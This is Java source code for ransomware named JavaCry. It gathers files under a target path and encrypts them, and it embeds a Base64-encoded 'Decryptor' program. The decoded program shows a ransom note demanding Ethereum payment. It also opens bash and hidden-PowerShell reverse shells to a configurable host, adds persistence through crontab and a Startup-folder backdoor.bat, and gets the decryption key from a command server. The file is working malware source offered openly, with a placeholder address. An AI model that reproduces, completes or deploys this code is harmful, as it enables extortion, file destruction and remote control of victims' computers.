import java.io.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.*;
import java.security.MessageDigest;
import java.security.spec.X509EncodedKeySpec;
import java.util.*;
import java.util.stream.Collectors;
import java.util.stream.Stream;
import java.nio.file.StandardCopyOption;;

public class JavaCry {
    /*
     * Dangerous target paths:
     * Mac & Linux:
     * private static String targetPath = "/";
     * 
     * Windows:
     * private static String targetPath = "C:\";
     */
private static String addr = "127.0.0.1";
private static String targetPath = "null";
    private static String os = System.getProperty("os.name").split(" ")[0];
    private static List<Path> files = new ArrayList<Path>();
    private static Random rand = new Random(System.currentTimeMillis());
    private static int id = (int) (rand.nextInt(Integer.MAX_VALUE));
    private static RSACrypt crypto;
private static String decryptorPayload = "aW1wb3J0IGphdmEuYXd0Lio7CmltcG9ydCBqYXZheC5zd2luZy4qOwppbXBvcnQgamF2YS5hd3QuZXZlbnQuKjsKaW1wb3J0IGphdmEuYXd0LkNvbG9yOwoKaW1wb3J0IGphdmEudXRpbC4qOwppbXBvcnQgamF2YS5uZXQuKjsKaW1wb3J0IGphdmEuaW8uKjsKaW1wb3J0IGphdmEuaW8uRmlsZU91dHB1dFN0cmVhbTsKaW1wb3J0IGphdmEudXRpbC5zdHJlYW0uQ29sbGVjdG9yczsKaW1wb3J0IGphdmEubmlvLmZpbGUuRmlsZXM7CmltcG9ydCBqYXZhLm5pby5maWxlLlBhdGg7CmltcG9ydCBqYXZhLm5pby5maWxlLlBhdGhzOwppbXBvcnQgamF2YS5pby5GaWxlSW5wdXRTdHJlYW07CmltcG9ydCBqYXZheC5jcnlwdG8uQ2lwaGVyOwppbXBvcnQgamF2YXguY3J5cHRvLktleUdlbmVyYXRvcjsKaW1wb3J0IGphdmF4LmNyeXB0by5TZWNyZXRLZXk7CmltcG9ydCBqYXZheC5jcnlwdG8uc3BlYy5TZWNyZXRLZXlTcGVjOwppbXBvcnQgamF2YXguY3J5cHRvLnNwZWMuSXZQYXJhbWV0ZXJTcGVjOwppbXBvcnQgamF2YS51dGlsLkJhc2U2NDsKaW1wb3J0IGphdmEudXRpbC5zdHJlYW0uU3RyZWFtOwoKaW1wb3J0IGphdmEuc2VjdXJpdHkuKjsKaW1wb3J0IGphdmF4LmNyeXB0by5CYWRQYWRkaW5nRXhjZXB0aW9uOwppbXBvcnQgamF2YXguY3J5cHRvLklsbGVnYWxCbG9ja1NpemVFeGNlcHRpb247CmltcG9ydCBqYXZhLnNlY3VyaXR5LnNwZWMuUEtDUzhFbmNvZGVkS2V5U3BlYzsKCmltcG9ydCBqYXZhLmFwcGxldC4qOwppbXBvcnQgamF2YS5pby5GaWxlOwppbXBvcnQgamF2YS5uZXQuKjsKCi8qCiAgIGRlY3J5cHRvcjoKICAgQlRDIHBheW1lbnQgaW50ZXJmYWNlCiAgIFJlcXVlc3QgZm9yIGRlY3J5cHRpb24gZnVuY3Rpb25hbGl0eQogICBpZiByZWNlaXZlcyB0aGUga2V5LCB1c2UgdGhlIGtleSB0byBkZWNyeXB0IHRoZSBmaWxlcwogICBkZXN0cm95IGRlY3J5cHRvci5qYXZhCiAqLwoKCgpwdWJsaWMgY2xhc3MgRGVjcnlwdG9yIHsKICBwcml2YXRlIHN0YXRpYyBpbnQgaWQgPSA4MjM3ODAyNjM7CgogIC8vIG5ldHdvcmsgc2V0dGluZ3MKcHJpdmF0ZSBzdGF0aWMgU3RyaW5nIGFkZHJlc3MgPSAiMTI3LjAuMC4xIjsKICBwcml2YXRlIGludCBwb3J0ID0gNTU1NTsKCnByaXZhdGUgYm9vbGVhbiB1c2luZ1JldlNoZWxsID0gdHJ1ZTsKcHJpdmF0ZSBpbnQgcmV2UG9ydCA9IDM0NTY7CnByaXZhdGUgYm9vbGVhbiB1c2VQZXJzaXN0ZW5jZSA9IHRydWU7CgogIC8vIHNvY2tldCB2YXJpYWJsZXMKICBwcml2YXRlIFNvY2tldCBzb2NrZXQ7CiAgcHJpdmF0ZSBEYXRhT3V0cHV0U3RyZWFtIG91dCA9IG51bGw7CiAgcHJpdmF0ZSBEYXRhSW5wdXRTdHJlYW0gaW4gPSBudWxsOwoKICAvLyBjcnlwdCBzZXR0aW5ncwpwcml2YXRlIHN0YXRpYyBTdHJpbmcgdGFyZ2V0UGF0aCA9ICJudWxsIjsKICBwcml2YXRlIFN0cmluZyBiNjRwcml2a2V5OwogIHByaXZhdGUgUHJpdmF0ZUtleSBwcml2YXRlX2tleTsKICBwcml2YXRlIENpcGhlciBSU0FfQ2lwaGVyOwogIHByaXZhdGUgQ2lwaGVyIEFFU19DaXBoZXI7CiAgcHJpdmF0ZSBzdGF0aWMgamF2YS51dGlsLkxpc3Q8UGF0aD4gZmlsZXMgPSBuZXcgQXJyYXlMaXN0PFBhdGg+KCk7CiAgcHJpdmF0ZSBTdHJpbmcgT1MgPSBTeXN0ZW0uZ2V0UHJvcGVydHkoIm9zLm5hbWUiKTsKCiAgcHJpdmF0ZSBDbGllbnRUaHJlYWQgYmFja2VuZDsKCiAgcHVibGljIHZvaWQgc2hlbGwoKSB7CiAgICBUaHJlYWQgdGhyZWFkID0gbmV3IFRocmVhZCgpewogICAgICBwdWJsaWMgdm9pZCBydW4oKXsKICAgICAgICBQcm9jZXNzIHA7CiAgICAgICAgdHJ5IHsKICAgICAgICAgIGlmIChPUy5lcXVhbHMoIkxpbnV4IikgfHwgT1MuZXF1YWxzKCJNYWMgT1MgWCIpKSB7CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgcCA9IFJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMoImJhc2ggLWMgJEB8YmFzaCAwIGVjaG8gYmFzaCAtaSA+JiAvZGV2L3RjcC8iICsgYWRkcmVzcyArICIvIiArIHJldlBvcnQgKyAiIDA+JjEiKTsKICAgICAgICAgICAgfSBjYXRjaCAoRXhjZXB0aW9uIGUpIHsKICAgICAgICAgICAgICBTeXN0ZW0ub3V0LnByaW50bG4oIjEiICsgZSk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKHVzZVBlcnNpc3RlbmNlKSB7CiAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgU3lzdGVtLm91dC5wcmludGxuKCJwZXJzaXN0ZW5jZSBzdGFydGVkIik7CiAgICAgICAgICAgICAgU3RyaW5nW10gY21kID0gewogICAgICAgICAgICAgICAgIi9iaW4vc2giLAogICAgICAgICAgICAgICAgIi1jIiwKICAgICAgICAgICAgICAgICJlY2hvICcqICogKiAqICogYmFzaCAtaSA+JiAvZGV2L3RjcC8iICsgYWRkcmVzcyArICIvIiArIHJldlBvcnQgKyAiIDA+JjEnIHwgY3JvbnRhYiAtIgogICAgICAgICAgICAgIH07CiAgICAgICAgICAgICAgcCA9IFJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMoY21kKTsKICAgICAgICAgICAgICBCdWZmZXJlZFJlYWRlciBiID0gbmV3IEJ1ZmZlcmVkUmVhZGVyKG5ldyBJbnB1dFN0cmVhbVJlYWRlcihwLmdldElucHV0U3RyZWFtKCkpKTsKCiAgICAgICAgICAgICAgICBTdHJpbmcgc3RyOwoKICAgICAgICAgICAgICAgIHdoaWxlICgoc3RyID0gYi5yZWFkTGluZSgpKSAhPSBudWxsKSB7CiAgICAgICAgICAgICAgICAgICAgU3lzdGVtLm91dC5wcmludGxuKHN0cik7CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgYi5jbG9zZSgpOwogICAgICAgICAgICAgICAgU3lzdGVtLm91dC5wcmludGxuKCJwZXJzaXN0ZW5jZSBkb25lIik7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgIFN5c3RlbS5vdXQucHJpbnRsbigibGludXggZXhlY3V0aW9uIik7CiAgICAgICAgICB9IGVsc2UgaWYgKE9TLmVxdWFscygiV2luZG93cyIpKSB7CiAgICAgICAgICAgIFN0cmluZyBjbWQgPSAicG93ZXJzaGVsbCAtTm9QIC1Ob25JIC1XIEhpZGRlbiAtRXhlYyBCeXBhc3MgLUNvbW1hbmQgTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVENQQ2xpZW50KFwiIiArIGFkZHJlc3MgKyAiXCIsIiArIHJldlBvcnQgKyAiKTskc3RyZWFtID0gJGNsaWVudC5HZXRTdHJlYW0oKTtbYnl0ZVtdXSRieXRlcyA9IDAuLjY1NTM1fCV7MH07d2hpbGUoKCRpID0gJHN0cmVhbS5SZWFkKCRieXRlcywgMCwgJGJ5dGVzLkxlbmd0aCkpIC1uZSAwKXs7JGRhdGEgPSAoTmV3LU9iamVjdCAtVHlwZU5hbWUgU3lzdGVtLlRleHQuQVNDSUlFbmNvZGluZykuR2V0U3RyaW5nKCRieXRlcywwLCAkaSk7JHNlbmRiYWNrID0gKGlleCAkZGF0YSAyPiYxIHwgT3V0LVN0cmluZyApOyRzZW5kYmFjazIgID0gJHNlbmRiYWNrICsgXCJQUyBcIiArIChwd2QpLlBhdGggKyBcIj4gXCI7JHNlbmRieXRlID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kYmFjazIpOyRzdHJlYW0uV3JpdGUoJHNlbmRieXRlLDAsJHNlbmRieXRlLkxlbmd0aCk7JHN0cmVhbS5GbHVzaCgpfTskY2xpZW50LkNsb3NlKCkiOwogICAgICAgICAgICBwID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhjbWQpOwogICAgICAgICAgICBpZiAodXNlUGVyc2lzdGVuY2UpIHsKICAgICAgICAgICAgICBwID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYygiZWNobyAiICsgY21kICsgIiA+IEM6XFxVc2Vyc1xcUmFzdGFcXEFwcERhdGFcXFJvYW1pbmdcXE1pY3Jvc29mdFxcV2luZG93c1xcU3RhcnQgTWVudVxcUHJvZ3JhbXNcXFN0YXJ0dXBcXGJhY2tkb29yLmJhdCIpOwogICAgICAgICAgICB9CgogICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgU3lzdGVtLm91dC5wcmludGxuKE9TKTsKICAgICAgICAgIH0KICAgICAgICB9IGNhdGNoIChFeGNlcHRpb24gZSkgewogICAgICAgICAgU3lzdGVtLm91dC5wcmludGxuKGUpOwogICAgICAgIH0KICAgICAgICBTeXN0ZW0ub3V0LnByaW50bG4oIlRocmVhZCBkb25lIik7CiAgICAgIH0KICAgIH07CiAgdGhyZWFkLnN0YXJ0KCk7CiAgU3lzdGVtLm91dC5wcmludGxuKCJUaHJlYWQgc2hvdWxkIGJlIHN0YXJ0ZWQiKTsKICB9CgoKICBwdWJsaWMgRGVjcnlwdG9yKCkgewoKICAgIGlmICh1c2luZ1JldlNoZWxsKSB7CiAgICAgIHNoZWxsKCk7CiAgICB9CgoKICAgIFN0cmluZyBub3RlID0gU3RyaW5nLmpvaW4oIlxuIiwgIjxodG1sPiIsICIiLAogICAgICAgICI8aDEgc3R5bGUgPSAnZm9udC1zaXplOiAzMnB4OyBwYWRkaW5nOiAxMHB4IDEwcHg7IGNvbG9yOiByZ2IoMjU1LDI1NSwyNTUpOyc+WW91ciBmaWxlcyBoYXZlIGJlZW4gZW5jcnlwdGVkLjwvaDE+IiwKICAgICAgICAiPHAgc3R5bGUgPSAncGFkZGluZzogMTBweCAxMHB4O2NvbG9yOiByZ2IoMjU1LDI1NSwyNTUpOyc+IiwKICAgICAgICAiWW91ciBmaWxlcyBoYXZlIGJlZW4gZW5jcnlwdGVkLiBJZiB5b3Ugd2FudCB0byBkZWNyeXB0IHlvdXIgZmlsZXMsIHBsZWFzZSBjb3B5IHRoZSBjb250ZW50IG9mIHNlbmR0b21lLnR4dCBzZW5kIGl0IHdpdGggJDEgRVRIIHRvIFtNeSBBZGRyZXNzXS4gWW91IGNhbiBmb2xsb3cgdGhpcyB0dXRvcmlhbCB0byBzZW5kIG1lIG1vbmV5OiBodHRwczovL3d3dy55b3V0dWJlLmNvbS93YXRjaD92PUV3eFBxYnNlRnJFLiBJIHdpbGwgY2hlY2sgdGhlIHBheW1lbnRzIGJlZm9yZSBJIGFwcHJvdmUgeW91ciByZXF1ZXN0IGZvciBkZWNyeXB0aW9uLiIsCiAgICAgICAgIjwvcD4iLCAiPHAgc3R5bGUgPSAncGFkZGluZzogMTBweCAxMHB4O2NvbG9yOiByZ2IoMjU1LDI1NSwyNTUpOyc+IiwKICAgICAgICAiPGJyPjxiPkRvbuKAmXQgZGVsZXRlIG9yIG1vZGlmeSBhbnkgY29udGVudCBpbiBLZXlfcHJvdGVjdGVkLmtleSwgb3IgeW91IHdpbGwgbG9zZSB5b3VyIGFiaWxpdHkgdG8gZGVjcnlwdCB5b3VyIGZpbGVzLjwvYj4iLAogICAgICAgICI8L3A+IiwgIjxwIHN0eWxlID0gJ3BhZGRpbmc6IDEwcHggMTBweDtjb2xvcjogcmdiKDI1NSwyNTUsMjU1KTsnPiIsCiAgICAgICAgIjxicj5JZiB5b3Ugd2FudCB0byBvcGVuIHRoaXMgd2luZG93IGFnYWluLCBwbGVhc2UgcnVuIERlY3J5cHRvci5qYXIuPGJyPiIsICI8L3A+IiwgIjwvaHRtbD4iKTsKCiAgICBKRnJhbWUgZiA9IG5ldyBKRnJhbWUoKTsKICAgIEpQYW5lbCBwYW5lbCA9IG5ldyBKUGFuZWwoKTsKICAgIEpQYW5lbCBwYW5lbDIgPSBuZXcgSlBhbmVsKCk7CiAgICBKTGFiZWwgaHRtbCA9IG5ldyBKTGFiZWwoKTsKICAgIEpCdXR0b24gYiA9IG5ldyBKQnV0dG9uKCJSZXF1ZXN0IGZvciBEZWNyeXB0aW9uIik7CiAgICBKTGFiZWwgc3RhdHVzID0gbmV3IEpMYWJlbCgiIik7CiAgICBVUkwgdXJsID0gRGVjcnlwdG9yLmNsYXNzLmdldFJlc291cmNlKCJsb2FkaW5nLmdpZiIpOwogICAgSW1hZ2VJY29uIGltYWdlSWNvbiA9IG5ldyBJbWFnZUljb24odXJsKTsKICAgIEpMYWJlbCBsb2FkaW5nID0gbmV3IEpMYWJlbChpbWFnZUljb24pOwoKICAgIGh0bWwuc2V0VGV4dChub3RlKTsKICAgIGh0bWwuc2V0QWxpZ25tZW50WChDb21wb25lbnQuQ0VOVEVSX0FMSUdOTUVOVCk7CiAgICBiLnNldEFsaWdubWVudFgoQ29tcG9uZW50LkNFTlRFUl9BTElHTk1FTlQpOwogICAgc3RhdHVzLnNldEFsaWdubWVudFgoQ29tcG9uZW50LkNFTlRFUl9BTElHTk1FTlQpOwogICAgc3RhdHVzLnNldEFsaWdubWVudFkoQ29tcG9uZW50LkJPVFRPTV9BTElHTk1FTlQpOwogICAgc3RhdHVzLnNldEhvcml6b250YWxBbGlnbm1lbnQoSkxhYmVsLkNFTlRFUik7CiAgICBzdGF0dXMuc2V0Rm9udChuZXcgRm9udChGb250Lk1PTk9TUEFDRUQsIEZvbnQuUExBSU4sIDE0KSk7CiAgICBwYW5lbDIuc2V0QmFja2dyb3VuZChuZXcgQ29sb3IoNTAsIDAsIDApKTsKCiAgICBiLmFkZEFjdGlvbkxpc3RlbmVyKG5ldyBBY3Rpb25MaXN0ZW5lcigpIHsKCiAgICAgIEBPdmVycmlkZQogICAgICBwdWJsaWMgdm9pZCBhY3Rpb25QZXJmb3JtZWQoQWN0aW9uRXZlbnQgZSkgewogICAgICAgIGJhY2tlbmQgPSBuZXcgQ2xpZW50VGhyZWFkKGFkZHJlc3MsIHBvcnQsIGlkLCBzdGF0dXMsIGIsIGxvYWRpbmcpOwogICAgICAgIGJhY2tlbmQuc3RhcnQoKTsKICAgICAgfQogICAgfSk7CgogICAgZi5zZXRMYXlvdXQobmV3IEdyaWRMYXlvdXQoMCwgMSkpOwogICAgcGFuZWwuc2V0TGF5b3V0KG5ldyBCb3hMYXlvdXQocGFuZWwsIEJveExheW91dC5ZX0FYSVMpKTsKICAgIHBhbmVsLmFkZChodG1sKTsKICAgIHBhbmVsLmFkZChiKTsKICAgIHBhbmVsLnNldEJhY2tncm91bmQobmV3IENvbG9yKDUwLCAwLCAwKSk7CiAgICBmLmFkZChwYW5lbCk7CiAgICBwYW5lbDIuc2V0TGF5b3V0KG5ldyBHcmlkTGF5b3V0KDAsIDEpKTsKICAgIHBhbmVsMi5hZGQoc3RhdHVzKTsKICAgIHBhbmVsMi5hZGQobG9hZGluZyk7CiAgICBsb2FkaW5nLnNldFZpc2libGUoZmFsc2UpOwogICAgZi5hZGQocGFuZWwyKTsKICAgIC8vIGYuYWRkKG5ldyBKQnV0dG9uKCJCdXR0b24gMSIpKTsKICAgIC8vIGYuYWRkKG5ldyBKQnV0dG9uKCJCdXR0b24gMiIpKTsKCiAgICBmLnNldFRpdGxlKCJKYXZhQ3J5IERlY3J5cHRvciIpOwogICAgZi5zZXREZWZhdWx0Q2xvc2VPcGVyYXRpb24oSkZyYW1lLkVYSVRfT05fQ0xPU0UpOwogICAgZi5zZXRMb2NhdGlvblJlbGF0aXZlVG8obnVsbCk7CiAgICBmLnNldEV4dGVuZGVkU3RhdGUoSkZyYW1lLk1BWElNSVpFRF9CT1RIKTsKICAgIGYucGFjaygpOwogICAgZi5zZXRWaXNpYmxlKHRydWUpOwogICAgaHRtbC5zZXRGb250KG5ldyBGb250KEZvbnQuU0FOU19TRVJJRiwgRm9udC5QTEFJTiwgMTgpKTsKICAgIGIuc2V0Rm9udChuZXcgRm9udCgiQXJpYWwiLCBGb250LlBMQUlOLCAzMCkpOwogICAgYi5zZXRCYWNrZ3JvdW5kKENvbG9yLlJFRCk7CiAgICBiLnNldEZvcmVncm91bmQoQ29sb3IuV0hJVEUpOwogICAgYi5zZXRPcGFxdWUodHJ1ZSk7CgogICAgc3RhdHVzLnNldEZvcmVncm91bmQoQ29sb3IuUkVEKTsKICAgIGIuc2V0Qm9yZGVyKEJvcmRlckZhY3RvcnkuY3JlYXRlQ29tcG91bmRCb3JkZXIoCiAgICAgICAgQm9yZGVyRmFjdG9yeS5jcmVhdGVMaW5lQm9yZGVyKENvbG9yLlJFRCwgNSksCiAgICAgICAgQm9yZGVyRmFjdG9yeS5jcmVhdGVMaW5lQm9yZGVyKENvbG9yLkJMQUNLLCAyMCkpKTsKICB9CgogIHB1YmxpYyBzdGF0aWMgU3RyaW5nIGdldFRhcmdldFBhdGgoKSB7CiAgICByZXR1cm4gdGFyZ2V0UGF0aDsKICB9CgogIC8vIG1haW4gbWV0aG9kCiAgcHVibGljIHN0YXRpYyB2b2lkIG1haW4oU3RyaW5nIGFyZ3NbXSkgewoKICAgIERlY3J5cHRvciBhd3Rfb2JqID0gbmV3IERlY3J5cHRvcigpOwogCiAgICAKICB9Cgp9CgoKY2xhc3MgQ2xpZW50VGhyZWFkIGV4dGVuZHMgVGhyZWFkIHsKICBwcml2YXRlIFN0cmluZyBzdGF0ZTsKICBwcml2YXRlIHN0YXRpYyBTdHJpbmcgdGFyZ2V0UGF0aDsKICBwcml2YXRlIHN0YXRpYyBqYXZhLnV0aWwuTGlzdDxQYXRoPiBmaWxlcyA9IG5ldyBBcnJheUxpc3Q8UGF0aD4oKTsKICBwcml2YXRlIFN0cmluZyBiNjRwcml2a2V5OwogIHByaXZhdGUgUHJpdmF0ZUtleSBwcml2YXRlX2tleTsKICBwcml2YXRlIENpcGhlciBSU0FfQ2lwaGVyOwogIHByaXZhdGUgQ2lwaGVyIEFFU19DaXBoZXI7CiAgcHJpdmF0ZSBTb2NrZXQgc29ja2V0OwogIHByaXZhdGUgU3RyaW5nIGFkZHJlc3M7CiAgcHJpdmF0ZSBKTGFiZWwgc3RhdHVzOwogIHByaXZhdGUgSkxhYmVsIGxvYWRpbmc7CiAgcHJpdmF0ZSBKQnV0dG9uIGJ1dHRvbjsKICBwcml2YXRlIGludCBwb3J0OwogIHByaXZhdGUgaW50IGlkOwoKICBwdWJsaWMgQ2xpZW50VGhyZWFkKFN0cmluZyBhZGRyZXNzLCBpbnQgcG9ydCwgaW50IGlkLCBKTGFiZWwgc3RhdHVzLCBKQnV0dG9uIGJ1dHRvbiwgSkxhYmVsIGxvYWRpbmcpIHsKICAgIHN0YXRlID0gIjxkZWY+IjsKICAgIHRhcmdldFBhdGggPSBEZWNyeXB0b3IuZ2V0VGFyZ2V0UGF0aCgpOwogICAgdGhpcy5wb3J0ID0gcG9ydDsKICAgIHRoaXMuYWRkcmVzcyA9IGFkZHJlc3M7CiAgICB0aGlzLmlkID0gaWQ7CiAgICB0aGlzLnN0YXR1cyA9IHN0YXR1czsKICAgIHRoaXMubG9hZGluZyA9IGxvYWRpbmc7CiAgICB0aGlzLmJ1dHRvbiA9IGJ1dHRvbjsKICAgIFN5c3RlbS5vdXQucHJpbnRsbigiYmFja2VuZCBpbml0aWFsaXplZCIpOwogIH0KCiAgcHVibGljIHZvaWQgcnVuKCkgewogICAgc3RhdHVzLnNldFRleHQoIldhaXRpbmcgZm9yIGFwcHJvdmFsIik7CgogICAgbG9hZGluZy5zZXRWaXNpYmxlKHRydWUpOwogICAgUmVxdWVzdEZvckRlY3J5cHRpb24oKTsKICAgIGxvYWRpbmcuc2V0VmlzaWJsZShmYWxzZSk7CiAgfQoKICBwdWJsaWMgdm9pZCBSZXF1ZXN0Rm9yRGVjcnlwdGlvbigpIHsKICAgIHRyeSB7CiAgICAgIGJ1dHRvbi5zZXRFbmFibGVkKGZhbHNlKTsKICAgICAgU3lzdGVtLm91dC5wcmludGxuKCJ0cnlpbmcgdG8gY29ubmVjdCIpOwogICAgICBzb2NrZXQgPSBuZXcgU29ja2V0KGFkZHJlc3MsIHBvcnQpOwogICAgICBTeXN0ZW0ub3V0LnByaW50bG4oImNvbm5lY3RlZCIpOwoKICAgICAgLy8gc2VuZHMgb3V0cHV0IHRvIHRoZSBzb2NrZXQKICAgICAgRGF0YUlucHV0U3RyZWFtIGluID0gbmV3IERhdGFJbnB1dFN0cmVhbShzb2NrZXQuZ2V0SW5wdXRTdHJlYW0oKSk7CiAgICAgIERhdGFPdXRwdXRTdHJlYW0gb3V0ID0gbmV3IERhdGFPdXRwdXRTdHJlYW0oc29ja2V0LmdldE91dHB1dFN0cmVhbSgpKTsKCiAgICAgIG91dC53cml0ZVVURihTdHJpbmcudmFsdWVPZihpZCkpOwogICAgICBiNjRwcml2a2V5ID0gaW4ucmVhZFVURigpOwogICAgICBTeXN0ZW0ub3V0LnByaW50bG4oYjY0cHJpdmtleSk7CiAgICAgIGlmIChiNjRwcml2a2V5LmVxdWFscygiYnV0IEkgcmVmdXNlIikpIHsKICAgICAgICBzdGF0dXMuc2V0VGV4dCgiWW91ciByZXF1ZXN0IGhhcyBiZWVuIHJlamVjdGVkLiIpOwogICAgICAgIGJ1dHRvbi5zZXRFbmFibGVkKHRydWUpOwogICAgICAgIHJldHVybjsKICAgICAgfQogICAgICBieXRlW10gcHViID0gQmFzZTY0LmdldERlY29kZXIoKS5kZWNvZGUoYjY0cHJpdmtleSk7CiAgICAgIFBLQ1M4RW5jb2RlZEtleVNwZWMgc3BlYyA9IG5ldyBQS0NTOEVuY29kZWRLZXlTcGVjKHB1Yik7CiAgICAgIEtleUZhY3RvcnkgZmFjdG9yeSA9IEtleUZhY3RvcnkuZ2V0SW5zdGFuY2UoIlJTQSIpOwogICAgICBwcml2YXRlX2tleSA9IGZhY3RvcnkuZ2VuZXJhdGVQcml2YXRlKHNwZWMpOwoKICAgICAgUlNBX0NpcGhlciA9IENpcGhlci5nZXRJbnN0YW5jZSgiUlNBIik7CiAgICAgIEFFU19DaXBoZXIgPSBDaXBoZXIuZ2V0SW5zdGFuY2UoIkFFUyIpOwogICAgICB0cnkgKFN0cmVhbTxQYXRoPiBwYXRocyA9IEZpbGVzLndhbGsoUGF0aHMuZ2V0KHRhcmdldFBhdGgpKSkgewogICAgICAgIGZpbGVzID0gcGF0aHMuZmlsdGVyKEZpbGVzOjppc1JlZ3VsYXJGaWxlKS5jb2xsZWN0KENvbGxlY3RvcnMudG9MaXN0KCkpOwogICAgICB9IGNhdGNoIChFeGNlcHRpb24gZXJyKSB7CiAgICAgICAgOwogICAgICB9CiAgICAgIHRyeSB7CiAgICAgICAgZGVjcnlwdEZpbGVzKCk7CiAgICAgICAgc3RhdHVzLnNldFRleHQoIllvdXIgcmVxdWVzdCBoYXMgYmVlbiBhY2NlcHRlZC4iKTsKICAgICAgICBidXR0b24uc2V0RW5hYmxlZCh0cnVlKTsKICAgICAgfSBjYXRjaCAoRXhjZXB0aW9uIGVycikgewogICAgICAgIHN0YXR1cy5zZXRUZXh0KCJSZXF1ZXN0IGZhaWxlZC4iKTsKICAgICAgICBidXR0b24uc2V0RW5hYmxlZCh0cnVlKTsKICAgICAgfQogICAgfSBjYXRjaCAoVW5rbm93bkhvc3RFeGNlcHRpb24gdSkgewogICAgICBzdGF0dXMuc2V0VGV4dCgiUmVxdWVzdCBmYWlsZWQuIik7CiAgICAgIGJ1dHRvbi5zZXRFbmFibGVkKHRydWUpOwogICAgICBTeXN0ZW0ub3V0LnByaW50bG4odSk7CiAgICB9IGNhdGNoIChJT0V4Y2VwdGlvbiBpKSB7CiAgICAgIHN0YXR1cy5zZXRUZXh0KCJSZXF1ZXN0IGZhaWxlZC4iKTsKICAgICAgYnV0dG9uLnNldEVuYWJsZWQodHJ1ZSk7CiAgICAgIFN5c3RlbS5vdXQucHJpbnRsbihpKTsKICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBlcnIpIHsKICAgICAgc3RhdHVzLnNldFRleHQoIlJlcXVlc3QgZmFpbGVkLiIpOwogICAgICBidXR0b24uc2V0RW5hYmxlZCh0cnVlKTsKICAgICAgU3lzdGVtLm91dC5wcmludGxuKGVycik7CiAgICB9CiAgfQoKICBwdWJsaWMgYnl0ZVtdIFJTQUNyeXB0KEZpbGUgZikgewogICAgdHJ5IHsKICAgICAgRmlsZUlucHV0U3RyZWFtIGluID0gbmV3IEZpbGVJbnB1dFN0cmVhbShmKTsKICAgICAgYnl0ZVtdIGlucHV0ID0gbmV3IGJ5dGVbKGludCkgZi5sZW5ndGgoKV07CiAgICAgIGluLnJlYWQoaW5wdXQpOwoKICAgICAgRmlsZU91dHB1dFN0cmVhbSBvdXQgPSBuZXcgRmlsZU91dHB1dFN0cmVhbShmKTsKICAgICAgYnl0ZVtdIG91dHB1dCA9IFJTQV9DaXBoZXIuZG9GaW5hbChpbnB1dCk7CgogICAgICByZXR1cm4gb3V0cHV0OwogICAgfSBjYXRjaCAoRXhjZXB0aW9uIGUpIHsKICAgICAgU3lzdGVtLm91dC5wcmludGxuKGUpOwogICAgfQogICAgcmV0dXJuIG51bGw7CiAgfQoKICBwdWJsaWMgdm9pZCBBRVNDcnlwdChGaWxlIGYpIHsKICAgIHRyeSB7CiAgICAgIEZpbGVJbnB1dFN0cmVhbSBpbiA9IG5ldyBGaWxlSW5wdXRTdHJlYW0oZik7CiAgICAgIGJ5dGVbXSBpbnB1dCA9IG5ldyBieXRlWyhpbnQpIGYubGVuZ3RoKCldOwogICAgICBpbi5yZWFkKGlucHV0KTsKCiAgICAgIEZpbGVPdXRwdXRTdHJlYW0gb3V0ID0gbmV3IEZpbGVPdXRwdXRTdHJlYW0oZik7CiAgICAgIGJ5dGVbXSBvdXRwdXQgPSBBRVNfQ2lwaGVyLmRvRmluYWwoaW5wdXQpOwogICAgICBvdXQud3JpdGUob3V0cHV0KTsKCiAgICAgIG91dC5mbHVzaCgpOwogICAgICBvdXQuY2xvc2UoKTsKICAgICAgaW4uY2xvc2UoKTsKICAgICAgU3lzdGVtLm91dC5wcmludGxuKCJEZWNyeXB0aW5nIGZpbGU6ICIgKyBmKTsKICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBlKSB7CiAgICAgIFN5c3RlbS5vdXQucHJpbnRsbihlKTsKICAgIH0KICB9CgogIHB1YmxpYyB2b2lkIGRlY3J5cHRGaWxlcygpIHRocm93cyBFeGNlcHRpb24gewoKICAgIFJTQV9DaXBoZXIuaW5pdChDaXBoZXIuREVDUllQVF9NT0RFLCBwcml2YXRlX2tleSk7CiAgICBGaWxlIGsgPSBuZXcgRmlsZSgiS2V5X3Byb3RlY3RlZC5rZXkiKTsKICAgIGJ5dGVbXSBkYXRhID0gUlNBQ3J5cHQoayk7CiAgICBTZWNyZXRLZXkgQUVTS2V5ID0gbmV3IFNlY3JldEtleVNwZWMoZGF0YSwgMCwgZGF0YS5sZW5ndGgsICJBRVMiKTsKICAgIEFFU19DaXBoZXIuaW5pdChDaXBoZXIuREVDUllQVF9NT0RFLCBBRVNLZXkpOwogICAgZm9yIChQYXRoIHAgOiBmaWxlcykgewogICAgICB0cnkgewogICAgICAgIEZpbGUgZiA9IHAudG9GaWxlKCk7CiAgICAgICAgQUVTQ3J5cHQoZik7CiAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBlKSB7CiAgICAgICAgU3lzdGVtLm91dC5wcmludGxuKGUpOwogICAgICB9CiAgICB9CgogIH0KfQo=";
    private static Process process;
    private static List<String> avoidDir = new ArrayList<String>();

    // decrypt files from a list of paths
    public static void decryptFiles(String keyString) {
        crypto.setPubKey(keyString);

        for (Path p : files) {
            try {
                File f = p.toFile();
                crypto.decrypt(f);
            }

            catch (Exception e) {
                System.out.println(e);
            }
        }
    }

    // encrypt files from a list of paths
    public static void encryptFiles() {
        for (Path p : files) {
            try {
                File f = p.toFile();
                crypto.encrypt(f);
            }

            catch (Exception e) {
                System.out.println(e);
            }
        }
    }

    public static String replaceLine(String src, int lineno, String content) {
        String out = "";
        String[] lines = src.split("\n");

        for (int i = 0; i < lines.length; i++) {
            if (i + 1 == lineno) {
                out += content + "\n";
            }

            else {
                out += lines[i] + "\n";
            }
        }

        return out;
    }

